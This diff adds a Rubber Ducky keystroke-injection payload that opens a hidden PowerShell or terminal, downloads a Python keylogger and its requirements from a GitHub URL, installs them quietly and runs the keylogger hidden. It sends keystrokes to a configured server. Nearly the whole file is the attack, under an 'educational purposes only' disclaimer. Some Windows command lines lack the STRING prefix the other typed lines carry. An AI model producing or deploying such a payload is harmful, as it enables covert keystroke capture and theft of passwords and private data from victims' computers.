@@ -1,0 +1,111 @@
+REM Rubber Ducky Payload - Advanced Cross-Platform Version
+REM Educational purposes only - Use only on systems you own or have permission to test
+REM This version auto-detects OS, downloads keylogger, configures via env vars, and runs it
+
+DELAY 1000
+
+REM ============================================
+REM CONFIGURATION - CHANGE THESE BEFORE DEPLOY
+REM ============================================
+REM Server IP to send keystrokes to
+STRING export KEYLOGGER_IP="192.168.1.100"
+ENTER
+DELAY 200
+
+REM Server port
+STRING export KEYLOGGER_PORT="8080"
+ENTER
+DELAY 200
+
+REM Send interval in seconds
+STRING export KEYLOGGER_INTERVAL="10"
+ENTER
+DELAY 200
+
+REM Enable TLS/SSL (true/false) - requires certs on server
+STRING export KEYLOGGER_USE_TLS="false"
+ENTER
+DELAY 200
+
+REM Log level: DEBUG, INFO, WARNING, ERROR
+STRING export KEYLOGGER_LOG_LEVEL="WARNING"
+ENTER
+DELAY 200
+
+REM Log file path (empty = console only)
+STRING export KEYLOGGER_LOG_FILE=""
+ENTER
+DELAY 200
+
+REM TLS Certificate paths (if USE_TLS=true)
+REM STRING export KEYLOGGER_CA_CERT="/path/to/ca.pem"
+REM STRING export KEYLOGGER_CLIENT_CERT="/path/to/client.pem"
+REM STRING export KEYLOGGER_CLIENT_KEY="/path/to/key.pem"
+
+DELAY 500
+
+REM ============================================
+REM OS DETECTION AND TERMINAL OPEN
+REM ============================================
+REM Windows: GUI r -> powershell
+REM macOS: GUI SPACE -> Terminal
+REM Linux: CTRL ALT t
+
+REM --- WINDOWS (uncomment for Windows target) ---
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
+
+REM --- MACOS (uncomment for macOS target) ---
+REM GUI SPACE
+REM DELAY 500
+REM STRING Terminal
+REM ENTER
+REM DELAY 1500
+
+REM --- LINUX (uncomment for Linux target) ---
+REM CONTROL ALT t
+REM DELAY 1000
+
+DELAY 500
+
+REM ============================================
+REM DOWNLOAD AND DEPLOY
+REM ============================================
+
+REM Windows commands (PowerShell)
+cd $env:TEMP
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/davidbombal/python-keylogger/main/keylogger_configurable.py" -OutFile "keylogger_configurable.py"
+DELAY 3000
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/davidbombal/python-keylogger/main/requirements.txt" -OutFile "requirements.txt"
+DELAY 2000
+pip install -r requirements.txt --quiet
+DELAY 15000
+Start-Process python -ArgumentList "keylogger_configurable.py" -WindowStyle Hidden
+DELAY 1000
+EXIT
+ENTER
+
+REM macOS/Linux commands (uncomment and comment Windows section above)
+REM cd /tmp
+REM curl -sL "https://raw.githubusercontent.com/davidbombal/python-keylogger/main/keylogger_configurable.py" -o keylogger_configurable.py
+REM DELAY 3000
+REM curl -sL "https://raw.githubusercontent.com/davidbombal/python-keylogger/main/requirements.txt" -o requirements.txt
+REM DELAY 2000
+REM pip3 install -r requirements.txt -q
+REM DELAY 15000
+REM nohup python3 keylogger_configurable.py > /dev/null 2>&1 &
+REM DELAY 1000
+REM exit
+REM ENTER
+
+REM ============================================
+REM NOTES:
+REM 1. Change KEYLOGGER_IP to your server IP
+REM 2. Ensure keylogger_server.py is running on target server
+REM 3. For TLS: set USE_TLS=true and provide cert paths
+REM 4. Test delays may need adjustment for slower machines
+REM 5. Requires: Python 3.6+, pip, internet access (for initial download)
+REM ============================================
